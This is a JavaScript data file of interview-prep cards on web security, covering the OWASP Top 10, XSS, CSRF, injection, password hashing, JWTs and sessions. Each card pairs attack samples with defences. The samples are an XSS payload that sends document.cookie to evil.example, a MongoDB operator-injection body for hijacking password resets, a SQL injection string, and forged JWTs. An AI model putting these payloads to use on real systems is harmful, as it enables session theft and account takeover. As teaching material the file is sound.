// Security stack. Topics are auto-sorted Basic -> Intermediate -> Advanced by the registry.
// Runnable Node examples were checked on Node 26 (jsonwebtoken 9, bcryptjs 3); outputs match real runs.

const security = {
  name: 'Security',
  intro: 'Web security for a full-stack engineer: the attacks interviewers name, why they work, and the concrete defences you would put in a Node, Express, MongoDB and React app.',
  topics: [
    {
      id: 'owasp-top-10',
      title: 'OWASP Top 10 overview',
      level: 'basic',
      priority: 'must',
      frequency: 'very common',
      summary: 'A ranked list of the most critical web app security risks. The current edition is 2025, led by Broken Access Control.',
      note: "The OWASP Top 10:2025 replaced the 2021 edition. Many articles and interviewers still quote the 2021 list (where A03 was Injection and A06 was Vulnerable and Outdated Components), so mention that you know both.",
      what: [
        "OWASP (Open Worldwide Application Security Project) is a non-profit that publishes free security guidance. Its Top 10 is a list of the most critical risk categories for web applications, updated every few years from real vulnerability data and a community survey.",
        "The 2025 list: A01 Broken Access Control, A02 Security Misconfiguration, A03 Software Supply Chain Failures, A04 Cryptographic Failures, A05 Injection, A06 Insecure Design, A07 Authentication Failures, A08 Software or Data Integrity Failures, A09 Security Logging and Alerting Failures, A10 Mishandling of Exceptional Conditions.",
      ],
      deeper: [
        "What changed from 2021: SSRF (server-side request forgery) is no longer its own entry; it is folded into A01 Broken Access Control. Security Misconfiguration moved up to A02. 'Vulnerable and Outdated Components' grew into A03 Software Supply Chain Failures, covering dependencies, build systems and publishing. A10 Mishandling of Exceptional Conditions is new: bad error handling, failing open, and leaking details in errors.",
        "Map each item to something you do. A01: check ownership and tenant on every request (IDOR). A02: Helmet headers, no default credentials, no stack traces in production. A03: lockfiles, `npm audit`, careful dependency choice. A04: HTTPS everywhere, bcrypt or Argon2 for passwords. A05: parameterized queries, input validation. A07: rate-limited login, MFA, secure sessions. A09: audit logs and alerts. A10: a central error handler that fails closed.",
        "It is an awareness document, not a complete standard. For a full checklist teams use OWASP ASVS (Application Security Verification Standard).",
      ],
      why: "It gives teams and interviewers a shared vocabulary. Knowing it shows you think about security as part of building features, not as someone else's job.",
      analogy: "A 'top 10 causes of house fires' poster. It doesn't list every possible danger, but if you handle those ten, you have removed most of the real risk.",
      code: {
        lang: 'text',
        title: 'OWASP Top 10:2025 with a one-line defence each',
        source: `A01 Broken Access Control        -> check role + ownership + tenant on EVERY request
A02 Security Misconfiguration     -> secure headers, no debug/stack traces in prod
A03 Software Supply Chain Failures -> lockfile, npm audit, pin and review deps
A04 Cryptographic Failures        -> TLS everywhere, Argon2id/bcrypt for passwords
A05 Injection                     -> parameterized queries, validate input types
A06 Insecure Design               -> threat-model features before building
A07 Authentication Failures       -> rate limits, MFA, secure session/JWT handling
A08 Software/Data Integrity       -> verify signatures, protect CI/CD pipelines
A09 Logging and Alerting Failures -> audit logs + alerts, without leaking PII
A10 Exceptional Conditions        -> central error handler, fail closed`,
      },
      output: "Nothing to run. Use this card to answer 'name a few OWASP risks and how you defend against them' with one concrete control for each.",
      questions: [
        { q: 'What is the OWASP Top 10?', a: 'A regularly updated list of the ten most critical web application security risk categories, published by OWASP from real vulnerability data. The current edition is 2025.' },
        { q: 'What is number one on the OWASP Top 10, and why?', a: 'Broken Access Control: users acting outside their permissions, like reading another user\'s or tenant\'s data by changing an id. It is first because it is extremely common and often missed by automated scanners.' },
        { q: 'What changed between the 2021 and 2025 lists?', a: 'SSRF was merged into Broken Access Control, Security Misconfiguration rose to A02, Vulnerable Components became the broader Software Supply Chain Failures, and Mishandling of Exceptional Conditions was added.' },
        { q: 'How do you apply the OWASP Top 10 in daily work?', a: 'Use it as a review checklist: access checks on every endpoint, parameterized queries, secure headers, dependency audits in CI, strong password hashing, and logging that alerts without leaking secrets.' },
      ],
      answer30: "The OWASP Top 10 is a list of the most critical web app security risks. The 2025 edition is led by Broken Access Control, then Security Misconfiguration, Software Supply Chain Failures, Cryptographic Failures and Injection, with a new entry for mishandling exceptional conditions. In practice I treat it as a checklist: access and tenant checks on every endpoint, parameterized queries, secure headers, dependency audits in CI, proper password hashing, and safe logging.",
      mistakes: [
        'Quoting only the 2021 list as if it were current.',
        'Reciting the names without a single concrete defence for each.',
        'Thinking the Top 10 is a complete security standard; that is ASVS.',
        "Trap: 'Where did SSRF go?' In 2025 it is part of A01 Broken Access Control, not its own entry.",
      ],
      takeaway: '2025 list, led by Broken Access Control; know one concrete defence per item.',
    },

    {
      id: 'xss',
      title: 'XSS: stored, reflected, and DOM-based',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: "Cross-site scripting runs an attacker's script in your users' browsers. Escape output, avoid raw HTML, sanitize when you must, and add CSP.",
      what: [
        "XSS (cross-site scripting) happens when attacker-controlled text ends up in your page as code. The browser can't tell it apart from your own scripts, so it runs with the user's session: it can read the page, make requests as the user, or steal tokens in `localStorage`.",
        "Three types. **Stored**: the payload is saved (a comment, a candidate's name) and served to every viewer. **Reflected**: the payload is in the URL or form and echoed straight back in the response. **DOM-based**: frontend JavaScript reads something like `location.hash` and writes it into the page with `innerHTML`, never touching the server.",
      ],
      deeper: [
        "The core defence is context-aware output encoding: turn `<` into `&lt;` and so on, so data is shown as text. React does this automatically for `{value}` in JSX. The holes in React are `dangerouslySetInnerHTML`, `href={userUrl}` with a `javascript:` URL, refs that set `innerHTML`, and server-side templates that skip escaping.",
        "When you really must render user HTML (rich-text editors), sanitize it with DOMPurify using an allowlist of tags and attributes. Validate URLs so only `http:` and `https:` are allowed.",
        "Defence in depth: a strict Content Security Policy blocks inline and unknown scripts even if a payload slips through; `HttpOnly` cookies stop scripts from reading the session cookie; and storing tokens outside `localStorage` reduces what XSS can steal. Note that XSS can still make requests as the user, so HttpOnly limits damage but doesn't fix XSS.",
      ],
      why: "XSS turns your trusted site into the attacker's tool. In an HR app, one stored payload in a candidate's name could run in every recruiter's browser.",
      analogy: "A notice board where anyone can pin notes. If the office manager reads every note aloud as an order ('Give the safe key to Bob'), someone will pin a malicious note. Escaping means reading notes as quotes, never as orders.",
      code: [
        {
          lang: 'js',
          title: 'Escaping turns a payload into harmless text (node xss.mjs)',
          source: `const escapeHtml = (s) =>
  String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);

const comment = \`<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">\`;

const unsafe = \`<p>\${comment}</p>\`;              // what innerHTML / dangerouslySetInnerHTML would render
const safe = \`<p>\${escapeHtml(comment)}</p>\`;    // what React's {comment} effectively does

console.log(unsafe);
console.log(safe);`,
        },
        {
          lang: 'jsx',
          title: 'The React holes and their fixes',
          source: `import DOMPurify from 'dompurify';

function Comment({ text, html, website }) {
  const safeUrl = /^https?:\\/\\//i.test(website) ? website : '#'; // blocks javascript: URLs
  return (
    <div>
      <p>{text}</p>                                              {/* safe: auto-escaped */}
      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} /> {/* sanitize first */}
      <a href={safeUrl} rel="noopener noreferrer">Website</a>
    </div>
  );
}`,
        },
      ],
      output: "The first line prints the raw `<img ... onerror=...>` tag, which a browser would execute, sending cookies to evil.example. The second prints `&lt;img src=x onerror=&quot;fetch(&#39;...&#39;+document.cookie)&quot;&gt;`, which the browser shows as plain text.",
      questions: [
        { q: 'What are the three types of XSS?', a: 'Stored: the payload is saved in the database and shown to other users. Reflected: it comes from the request and is echoed straight back. DOM-based: client-side JavaScript writes untrusted data into the page, for example with innerHTML.' },
        { q: 'Does React protect against XSS?', a: 'Mostly. JSX escapes values in `{}`. But `dangerouslySetInnerHTML`, `javascript:` URLs in href, and direct DOM writes via refs bypass it, so those need sanitizing or validation.' },
        { q: 'How do you prevent XSS?', a: 'Encode output for its context, avoid raw HTML, sanitize with DOMPurify when HTML is required, validate URLs, add a strict CSP, and keep session cookies HttpOnly.' },
        { q: 'Does an HttpOnly cookie stop XSS?', a: 'No. It stops a script from reading the cookie, but the injected script can still send requests as the user from their browser. It limits damage; it is not a fix.' },
      ],
      answer30: "XSS is when untrusted data gets executed as script in another user's browser. Stored XSS is saved and shown to others, reflected is echoed from the request, and DOM-based happens purely in frontend code like innerHTML. React escapes JSX values, so the risks are dangerouslySetInnerHTML, javascript: URLs and direct DOM writes. I sanitize with DOMPurify when HTML is needed, validate URLs, use a strict CSP, and keep session cookies HttpOnly so a script can't read them.",
      mistakes: [
        'Sanitizing input on the way in and then trusting it forever; encode on output for the right context.',
        'Writing your own HTML sanitizer with regex instead of DOMPurify.',
        'Assuming React makes XSS impossible.',
        "Trap: 'We store the JWT in localStorage, is that OK?' Any XSS can read it and send it anywhere. HttpOnly cookies avoid that, but then you must handle CSRF.",
      ],
      takeaway: 'Treat user data as text, never code: escape output, sanitize unavoidable HTML, add CSP.',
    },

    {
      id: 'csrf-samesite',
      title: 'CSRF and SameSite cookies',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: "CSRF tricks a logged-in user's browser into sending a request with their cookies. SameSite cookies plus CSRF tokens or origin checks stop it.",
      what: [
        "CSRF (cross-site request forgery) works because browsers attach cookies automatically. If you are logged in to `bank.com` and visit `evil.com`, a hidden form on evil.com can submit to `bank.com/transfer`, and your session cookie goes along with it.",
        "The attacker can't read the response; they just make your browser perform an action: change email, transfer money, delete data.",
      ],
      deeper: [
        "The `SameSite` cookie attribute controls when cookies go on cross-site requests. `Strict`: never sent cross-site, even when clicking a link to your site. `Lax`: sent on top-level GET navigations (clicking a link) but not on cross-site POSTs, iframes or fetch. `None`: always sent, and it requires `Secure`. Chromium browsers treat a cookie with no SameSite as Lax, but other browsers differ, so always set it explicitly.",
        "SameSite isn't enough on its own. 'Site' means the registrable domain, so `evil.example.com` is same-site with `app.example.com`; a compromised subdomain can still attack. And Lax still allows GET, so GET handlers must never change data.",
        "Extra defences: a CSRF token (synchronizer token stored in the session, or a signed double-submit cookie) that the frontend sends in a header; checking the `Origin` (or `Sec-Fetch-Site`) header on state-changing requests; and requiring a custom header like `Content-Type: application/json`, which forces a CORS preflight for cross-origin requests. The old `csurf` Express package is deprecated; use maintained alternatives such as `csrf-csrf` or framework built-ins.",
        "If you send a token in an `Authorization` header instead of cookies, classic CSRF doesn't apply, because the browser doesn't add that header automatically. The trade-off is that the token must live somewhere JavaScript can read it, which XSS can steal.",
      ],
      why: "Any app that authenticates with cookies is exposed to CSRF by default. It's the flip side of choosing HttpOnly cookies to defend against XSS.",
      analogy: "A forged letter sent through your office's internal mail. The mail room sees your department's stamp (the cookie) and delivers it, even though you never wrote it. SameSite tells the mail room to refuse letters that came in from outside the building.",
      code: {
        lang: 'js',
        title: 'Cookie settings plus an Origin check (Express)',
        source: `// Set auth cookies with explicit flags
res.cookie('access_token', token, {
  httpOnly: true,        // JS can't read it (limits XSS damage)
  secure: true,          // HTTPS only
  sameSite: 'lax',       // not sent on cross-site POST/fetch
  maxAge: 15 * 60 * 1000,
  path: '/',
});

// Reject state-changing requests from other origins
const ALLOWED = new Set(['https://app.octagnt.example']);
function originCheck(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const origin = req.get('Origin');
  if (!origin || !ALLOWED.has(origin)) return res.status(403).json({ error: 'Bad origin' });
  next();
}
app.use(originCheck);`,
      },
      output: "A hidden form on evil.com that POSTs to your API gets no auth cookie because of SameSite=Lax, and even if a cookie were sent, the Origin check returns 403. Normal requests from your own frontend pass both checks.",
      questions: [
        { q: 'What is CSRF?', a: 'An attack where another site makes a logged-in user\'s browser send a state-changing request to your app. The browser attaches the user\'s cookies automatically, so the request looks legitimate.' },
        { q: 'What do SameSite Strict, Lax and None mean?', a: 'Strict: cookie never sent on cross-site requests. Lax: sent only on top-level GET navigations from other sites. None: always sent, and must be paired with Secure.' },
        { q: 'Is SameSite=Lax enough to stop CSRF?', a: 'It stops most cases, but not attacks from a sibling subdomain (same site) or via GET endpoints that change data. Add an Origin check or CSRF token for state-changing requests.' },
        { q: 'Does CSRF affect APIs that use Bearer tokens?', a: 'Not classic CSRF, because browsers don\'t attach the Authorization header automatically. But the token must be stored where JavaScript can read it, which exposes it to XSS.' },
      ],
      answer30: "CSRF is when another site makes a logged-in user's browser send a request to my app, and the browser attaches the cookies automatically. For cookie-based auth I set SameSite=Lax or Strict, HttpOnly and Secure, never change data on GET, and check the Origin header or use a CSRF token on state-changing requests. SameSite alone isn't enough because subdomains count as the same site. Bearer tokens in headers avoid CSRF, but then XSS is the bigger risk.",
      mistakes: [
        'Changing data in GET handlers, which Lax cookies still allow.',
        'Using `SameSite=None` without `Secure`; browsers reject the cookie.',
        'Relying on CORS to stop CSRF. A simple form POST never triggers CORS checks.',
        "Trap: 'Same-site vs same-origin?' Same-origin needs scheme, host and port to match. Same-site only needs the same registrable domain, so `a.example.com` and `b.example.com` are same-site.",
      ],
      takeaway: 'Cookies are sent automatically; SameSite plus an origin check or CSRF token makes forged requests fail.',
    },

    {
      id: 'injection-sql-nosql',
      title: 'SQL and NoSQL injection',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: 'Injection happens when user input changes the structure of a query. Use parameterized queries in SQL and type-check input in MongoDB to block operator injection.',
      what: [
        "**SQL injection**: building a query by gluing strings, like `\"SELECT * FROM users WHERE email = '\" + email + \"'\"`. An input like `' OR '1'='1` changes the query's logic. The fix is parameterized queries (placeholders), where the database treats input strictly as data.",
        "**NoSQL injection** in MongoDB: there's no SQL string, but Express's JSON parser turns `{ \"token\": { \"$ne\": null } }` into a real object. If you pass that straight into a filter, the attacker has injected a query operator, turning 'token equals X' into 'token is anything'.",
      ],
      deeper: [
        "MongoDB operator injection defences: validate every input's type and shape with a schema (zod, joi, express-validator) so a field that should be a string can't be an object; strip keys starting with `$` or containing `.` (express-mongo-sanitize does this; check that the version you use supports Express 5); or turn on Mongoose's `sanitizeFilter` option, which wraps such objects in `$eq`.",
        "Also dangerous in Mongo: `$where` and `$function` run JavaScript on the server, so never put user input in them. Building aggregation pipelines from user input needs the same care.",
        "Other injection kinds share the same root cause: command injection (`exec('convert ' + fileName)`; use `execFile` with an argument array), LDAP, and template injection. And in the AI era, prompt injection: untrusted text inside an LLM prompt can change the model's instructions.",
      ],
      why: "Injection lets an attacker read or change data they should never touch, bypass login, or reset someone else's password. It is one of the oldest and still most damaging bugs.",
      analogy: "A form letter: 'Pay ___ to the bearer'. If someone writes '100 rupees, and also give them the keys' in the blank, and the clerk reads the whole thing as instructions, you have injection. Parameterized queries mean the blank can only ever hold an amount.",
      code: [
        {
          lang: 'js',
          title: 'Mongo operator injection and two fixes (node nosql.mjs)',
          source: `// POST /reset-password  with JSON body: { "token": { "$ne": null }, "newPassword": "hacked123" }
const body = JSON.parse('{"token":{"$ne":null},"newPassword":"hacked123"}');

// VULNERABLE: User.findOne({ resetToken: body.token })
const filter = { resetToken: body.token };
console.log('filter:', JSON.stringify(filter)); // "any user whose resetToken is not null"

// FIX 1: validate the type (zod/joi in real code)
function assertString(v, name) {
  if (typeof v !== 'string') throw new TypeError(\`\${name} must be a string\`);
  return v;
}
try {
  assertString(body.token, 'token');
} catch (e) {
  console.log('rejected:', e.message);
}

// FIX 2: strip keys that start with $ or contain a dot (like express-mongo-sanitize)
function stripOperators(obj) {
  if (obj && typeof obj === 'object') {
    for (const k of Object.keys(obj)) {
      if (k.startsWith('$') || k.includes('.')) delete obj[k];
      else stripOperators(obj[k]);
    }
  }
  return obj;
}
console.log('sanitized:', JSON.stringify(stripOperators(structuredClone(body))));`,
        },
        {
          lang: 'js',
          title: 'SQL: parameterized query (node-postgres)',
          source: `// VULNERABLE: string concatenation
// await pool.query(\`SELECT * FROM users WHERE email = '\${email}'\`);

// SAFE: placeholder, the driver sends the value separately from the SQL
const { rows } = await pool.query('SELECT id, email FROM users WHERE email = $1', [email]);`,
        },
      ],
      output: "The script prints `filter: {\"resetToken\":{\"$ne\":null}}`, meaning the vulnerable query would match the first user with any pending reset token, letting the attacker reset their password. Then `rejected: token must be a string` (type validation blocks it) and `sanitized: {\"token\":{},\"newPassword\":\"hacked123\"}` (the operator was stripped).",
      questions: [
        { q: 'What is SQL injection and how do you prevent it?', a: 'User input is concatenated into a SQL string and changes its logic. Prevent it with parameterized queries or an ORM that uses them, plus input validation and least-privilege database users.' },
        { q: 'Is MongoDB immune to injection?', a: 'No. If a JSON body like `{ "$ne": null }` is passed into a filter, the attacker injects a query operator. Validate types, strip `$` keys, or enable Mongoose `sanitizeFilter`.' },
        { q: 'What is the most reliable defence against NoSQL operator injection?', a: 'Schema validation of every request: if a field must be a string, reject anything else. Sanitizing `$` keys is a good second layer.' },
        { q: 'Why are $where and $function dangerous?', a: 'They execute JavaScript inside MongoDB, so user input there is code injection. Avoid them, or never let user input reach them.' },
      ],
      answer30: "Injection is when input changes the structure of a query instead of being treated as data. In SQL, I always use parameterized queries. In MongoDB there's no SQL string, but a JSON body can contain operators like $ne, so passing req.body fields straight into a filter can bypass checks, for example matching any reset token. I validate every input's type with a schema like zod, strip $-prefixed keys or enable Mongoose sanitizeFilter, and never use $where with user input.",
      mistakes: [
        'Believing MongoDB is safe from injection because it has no SQL.',
        'Passing `req.body` or `req.query` objects straight into `find` or `updateOne`.',
        'Escaping strings by hand instead of using placeholders.',
        "Trap: 'Can query strings inject operators too?' Yes. Parsers like `qs` turn `?token[$ne]=x` into `{ token: { $ne: 'x' } }`. Express 5 defaults to the simpler parser, but validate anyway.",
      ],
      takeaway: 'Input is data, never query structure: placeholders in SQL, type validation and $-stripping in Mongo.',
    },

    {
      id: 'auth-password-hashing',
      title: 'Authentication best practices and password hashing',
      level: 'basic',
      priority: 'must',
      frequency: 'very common',
      summary: 'Never store passwords; store a slow, salted hash (Argon2id or bcrypt). Add rate limits, MFA and safe reset flows.',
      what: [
        "You never store a user's password, not even encrypted. You store a hash: a one-way fingerprint. At login you hash what they typed and compare.",
        "Normal hashes like SHA-256 are too fast; an attacker with a GPU can try billions of guesses per second. Password hashes like **Argon2id**, **bcrypt** and **scrypt** are deliberately slow and use a random **salt** per password, so identical passwords get different hashes and precomputed tables are useless.",
      ],
      deeper: [
        "OWASP's current advice: Argon2id first choice (for example 19 MiB memory, 2 iterations, parallelism 1), scrypt if Argon2 isn't available, bcrypt for legacy systems with a cost of at least 10 (12 is common). PBKDF2 only where FIPS compliance requires it, with a very high iteration count. bcrypt only uses the first 72 bytes of input, so very long passphrases are silently truncated.",
        "NIST SP 800-63B (revision 4, 2025): at least 15 characters when the password is the only factor (8 if used with MFA), allow at least 64, no forced composition rules (like 'one symbol'), no periodic forced resets, but do check new passwords against lists of breached passwords.",
        "Around the hash: rate-limit and lock out slowly on failed logins, give the same error for 'no such user' and 'wrong password' (avoid user enumeration), offer MFA (TOTP or passkeys/WebAuthn), make reset tokens random, single-use and short-lived (store their hash), and invalidate sessions after a password change.",
      ],
      why: "Databases leak. If passwords are stored with a slow salted hash, a leak doesn't immediately become millions of compromised accounts, including users' accounts on other sites where they reused the password.",
      analogy: "A salt is a unique spice added to each dish before blending it. Even two identical recipes taste different, and the slow hash is a blender that takes a full second per dish, so testing millions of recipes takes forever.",
      code: {
        lang: 'js',
        title: 'bcrypt hash and compare (node hash.mjs, using bcryptjs)',
        source: `import bcrypt from 'bcryptjs'; // pure-JS bcrypt; 'bcrypt' (native) has the same API

const hash = await bcrypt.hash('correct horse battery staple', 12); // cost factor 12
console.log(hash.slice(0, 7), hash.length);           // algorithm + cost, total length
console.log(await bcrypt.compare('correct horse battery staple', hash));
console.log(await bcrypt.compare('wrong password', hash));

const again = await bcrypt.hash('correct horse battery staple', 12);
console.log(hash === again); // new random salt each time

// Argon2id (npm 'argon2'), the OWASP first choice:
// const hash = await argon2.hash(pw, { type: argon2.argon2id });
// const ok = await argon2.verify(hash, pw);`,
      },
      output: "Prints `$2b$12$ 60`, then `true`, `false`, `false`. The hash string stores the algorithm (2b), the cost (12) and the salt, so `compare` needs nothing else. Hashing the same password twice gives different strings because each gets a new salt.",
      questions: [
        { q: 'How should passwords be stored?', a: 'As a slow, salted, one-way hash using Argon2id, bcrypt or scrypt. Never plain text, never reversible encryption, never a fast hash like MD5 or SHA-256.' },
        { q: 'What is a salt and why is it needed?', a: 'A random value added to each password before hashing. Identical passwords get different hashes, so attackers can\'t use precomputed rainbow tables or crack many users at once.' },
        { q: 'Why not SHA-256 for passwords?', a: 'It is designed to be fast, so attackers can test billions of guesses per second. Password hashes are deliberately slow and memory-hard to make guessing expensive.' },
        { q: 'What else besides hashing makes login secure?', a: 'Rate limiting, generic error messages to prevent user enumeration, MFA, breached-password checks, secure single-use reset tokens, and invalidating sessions after a password change.' },
        { q: 'What does modern NIST guidance say about password rules?', a: 'Favour length over complexity: at least 15 characters for single-factor login, no forced symbol rules, no forced periodic changes, and block known breached passwords.' },
      ],
      answer30: "I never store passwords, only a slow salted hash: Argon2id by preference, or bcrypt with a cost around 12. The salt makes identical passwords hash differently, and the slowness makes brute force expensive, unlike SHA-256. Around that I rate-limit logins, return the same error for unknown user or wrong password, support MFA, use random single-use reset tokens with short expiry, and invalidate sessions after a password change. Current NIST guidance favours long passwords over complexity rules and checking against breached lists.",
      mistakes: [
        'Using MD5, SHA-1 or plain SHA-256 for passwords.',
        'Encrypting passwords instead of hashing them; if the key leaks, all passwords leak.',
        "Error messages like 'email not found' that let attackers discover which accounts exist.",
        'Comparing hashes or tokens with `===` where timing matters; use the library compare or `crypto.timingSafeEqual`.',
        "Trap: 'What is bcrypt's 72-byte limit?' bcrypt ignores input after 72 bytes. Argon2id has no such limit, which is one reason it's preferred.",
      ],
      takeaway: 'Hash, never store: Argon2id or bcrypt with a salt, plus rate limits, MFA and safe resets.',
    },

    {
      id: 'jwt-security',
      title: 'JWT security: storage, expiry, refresh rotation, algorithm pitfalls',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: 'Short-lived access tokens, rotating refresh tokens in HttpOnly cookies, and always verify with a fixed algorithm list.',
      note: "On your resume: you built cookie-based JWT auth with auto-renewal on Octagnt. See 'Cookie-based JWT auth with auto-renewal, and RBAC' in My Resume and Projects.",
      what: [
        "A JWT (JSON Web Token) has three base64url parts: header (algorithm), payload (claims like `sub`, `role`, `exp`) and signature. The payload is only encoded, not encrypted: anyone can read it. The signature only proves nobody changed it.",
        "Because a server can't easily 'cancel' a JWT before it expires, you keep access tokens short-lived (5-15 minutes) and use a longer-lived refresh token to get new ones.",
      ],
      deeper: [
        "**Storage**: `localStorage` is readable by any XSS. An `HttpOnly; Secure; SameSite` cookie is not, but needs CSRF protection. A common SPA pattern: access token in memory or a short-lived cookie, refresh token in an HttpOnly cookie scoped to the refresh path.",
        "**Refresh rotation**: every refresh returns a new refresh token and invalidates the old one. Store refresh tokens (hashed) server-side with a family id. If an already-used refresh token is presented again, it was probably stolen: revoke the whole family and force a new login.",
        "**Algorithm pitfalls**: always pass an explicit `algorithms` list to verify. Historic attacks include `alg: none` (unsigned token accepted) and RS/HS confusion (attacker signs with HS256 using the public RSA key as the HMAC secret). Use a long random secret for HS256 (at least 256 bits), or RS256/EdDSA when other services must verify without being able to sign. Validate `exp`, and `iss`/`aud` when several services issue tokens.",
        "**Revocation**: for logout or 'ban this user now', keep a short denylist of token ids (`jti`) in Redis until they expire, or a per-user token version that is checked on each request.",
        "Never put secrets or personal data in the payload; use `jwt.verify`, never `jwt.decode`, for auth decisions.",
      ],
      why: "JWTs are easy to issue and hard to take back. Most JWT incidents come from storing them carelessly, making them live too long, or trusting them without proper verification.",
      analogy: "A JWT is a festival wristband. Security can check it at a glance without calling the office (no DB lookup), but once it's on your wrist it's valid until it expires, so you print short-lived ones and swap them often.",
      code: {
        lang: 'js',
        title: 'Verify properly (node jwt.mjs, jsonwebtoken 9)',
        source: `import jwt from 'jsonwebtoken';

const SECRET = 'a-long-random-secret-from-a-secrets-manager-at-least-32-bytes';
const token = jwt.sign({ sub: 'u1', role: 'recruiter' }, SECRET, { algorithm: 'HS256', expiresIn: '15m' });

// 1) decode() does NOT verify anything: never use it for auth
console.log(jwt.decode(token).role);

// 2) Tampered payload: change role to admin, keep the old signature
const [h, , sig] = token.split('.');
const evilPayload = Buffer.from(JSON.stringify({ sub: 'u1', role: 'admin' })).toString('base64url');
try { jwt.verify(\`\${h}.\${evilPayload}.\${sig}\`, SECRET, { algorithms: ['HS256'] }); }
catch (e) { console.log(e.message); }

// 3) alg "none": an unsigned token
const none = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
try { jwt.verify(\`\${none}.\${evilPayload}.\`, SECRET, { algorithms: ['HS256'] }); }
catch (e) { console.log(e.message); }

// 4) Expired token
const old = jwt.sign({ sub: 'u1', exp: Math.floor(Date.now() / 1000) - 60 }, SECRET);
try { jwt.verify(old, SECRET, { algorithms: ['HS256'] }); }
catch (e) { console.log(e.name); }`,
      },
      output: "Prints `recruiter`, then `invalid signature` (the role was changed), `jwt signature is required` (the unsigned alg-none token is refused), and `TokenExpiredError`. Only `verify` with a fixed algorithm list is a security check; `decode` happily reads anything.",
      questions: [
        { q: 'Where should a JWT be stored in the browser?', a: 'Preferably in an HttpOnly, Secure, SameSite cookie, so XSS cannot read it, combined with CSRF protection. localStorage is simple but any XSS can steal the token.' },
        { q: 'What is refresh token rotation?', a: 'Each refresh issues a new refresh token and invalidates the old one. If an old token is reused, it signals theft, so the server revokes the whole token family and forces re-login.' },
        { q: 'What is the alg none attack?', a: 'A forged token with header `alg: none` and no signature. Badly configured libraries accepted it as valid. Always verify with an explicit `algorithms` list.' },
        { q: 'How do you log out or revoke a JWT before it expires?', a: 'Keep access tokens short-lived, delete or revoke the refresh token server-side, and for immediate revocation use a denylist of token ids or a per-user token version checked on each request.' },
        { q: 'Is the JWT payload secret?', a: 'No. It is base64url-encoded, not encrypted, so anyone holding the token can read it. Never put passwords or sensitive personal data in it.' },
      ],
      answer30: "A JWT is signed, not encrypted, so the payload is readable and the signature just proves it wasn't changed. I keep access tokens short, around 15 minutes, and use a refresh token in an HttpOnly, Secure, SameSite cookie with rotation: each refresh issues a new one, and reuse of an old one revokes the whole family. I always verify with a fixed algorithms list to block alg none and key confusion, use a long secret from a secrets manager, and handle revocation with a denylist or token version.",
      mistakes: [
        'Using `jwt.decode` instead of `jwt.verify` for auth.',
        'Access tokens valid for days or weeks.',
        'Weak or hard-coded secrets like "secret" committed to the repo.',
        'Putting emails, phone numbers or permissions you must revoke instantly into a long-lived token.',
        "Trap: 'JWTs are stateless, so no database is needed at all?' Not if you want logout, rotation or revocation; you need some server-side state for refresh tokens.",
      ],
      takeaway: 'Short access tokens, rotating refresh tokens in HttpOnly cookies, verify with a fixed algorithm.',
    },

    {
      id: 'session-vs-token',
      title: 'Session-based vs token-based authentication',
      level: 'basic',
      priority: 'must',
      frequency: 'very common',
      summary: 'Sessions keep login state on the server and give the browser an id; tokens carry signed claims the server verifies without a lookup.',
      what: [
        "**Session auth**: after login the server stores a session (in memory, Redis or the DB) and sends the browser a random session id in a cookie. Each request, the server looks up that id to find the user.",
        "**Token auth (usually JWT)**: after login the server signs a token holding the user's claims. Each request, the server verifies the signature and trusts the claims without a lookup.",
      ],
      deeper: [
        "Sessions: easy to revoke instantly (delete the session), small cookie, but every request needs a session store lookup, and with many servers the store must be shared (Redis).",
        "Tokens: no lookup, good across services and mobile apps, but hard to revoke before expiry and larger per request. In practice most token systems add server state back (refresh token store, denylist), which makes them closer to sessions.",
        "The transport is a separate choice from the format. You can put a session id or a JWT in a cookie, or send a JWT in an `Authorization: Bearer` header. Cookies need CSRF protection; headers need the token stored somewhere JavaScript can read.",
        "Rule of thumb: a single web app with one backend is often simpler and safer with server sessions in HttpOnly cookies. Multiple services, mobile clients or third-party APIs favour short-lived tokens.",
      ],
      why: "It's a design decision every backend makes, and interviewers use it to check you understand the trade-offs, not just the buzzwords.",
      analogy: "A session is a coat-check ticket: a number that means nothing until the attendant looks it up. A JWT is a signed permission slip that says what you're allowed to do; any guard can check the signature without calling anyone.",
      code: {
        lang: 'js',
        title: 'Same route, two auth styles (Express)',
        source: `// Session: express-session with a Redis store
app.use(session({
  store: new RedisStore({ client: redis }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 8 * 60 * 60 * 1000 },
}));
app.post('/login', async (req, res) => {
  const user = await checkPassword(req.body);
  req.session.regenerate(() => {          // new id after login: blocks session fixation
    req.session.userId = user.id;
    res.sendStatus(204);
  });
});

// Token: verify a JWT from a cookie on every request, no store lookup
function requireJwt(req, res, next) {
  try {
    req.user = jwt.verify(req.cookies.access_token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
    next();
  } catch {
    res.sendStatus(401);
  }
}`,
      },
      output: "With sessions, logging out is `req.session.destroy()` and takes effect immediately everywhere. With JWTs, each request is verified locally with no Redis call, but a stolen token keeps working until it expires unless you add a revocation check.",
      questions: [
        { q: 'Session vs token authentication?', a: 'Sessions store state on the server and the client holds an opaque id; tokens hold signed claims the server verifies without a lookup. Sessions revoke easily; tokens scale across services but are hard to revoke.' },
        { q: 'Why regenerate the session id after login?', a: 'To prevent session fixation, where an attacker plants a known session id before login and then uses it once the victim logs in.' },
        { q: 'Are JWTs always better for scaling?', a: 'Not necessarily. A shared Redis session store scales well, and real JWT systems usually add server state for refresh tokens and revocation anyway.' },
        { q: 'Can you put a JWT in a cookie?', a: 'Yes. Format (session id vs JWT) and transport (cookie vs header) are separate choices. A JWT in an HttpOnly cookie protects it from XSS but needs CSRF defences.' },
      ],
